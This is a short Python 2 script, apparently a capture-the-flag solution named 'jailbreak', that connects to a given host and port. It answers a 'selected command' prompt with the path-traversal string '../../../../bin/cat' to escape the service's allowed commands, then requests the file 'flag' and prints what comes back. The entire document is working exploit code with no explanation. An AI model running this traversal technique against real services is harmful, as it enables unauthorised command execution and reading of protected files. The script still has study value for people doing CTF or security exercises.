import socket 
from sys import argv

#IPaddr = "10.0.10.10"
#port = 1103


def jailbreak(IPaddr, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IPaddr, int(port)))

	while 1:
		output = s.recv(1024)
		if "selected command" in output:
			s.sendall("../../../../bin/cat"+'\n')
			#s.sendall("wc"+'\n')
		elif "parameter" in output: 
			s.sendall("flag"+'\n')
			flag = s.recv(1024)
			print flag
		elif not output: 
			#print "No more data"
			break
		#else:
			#print output


jailbreak(argv[1],argv[2])

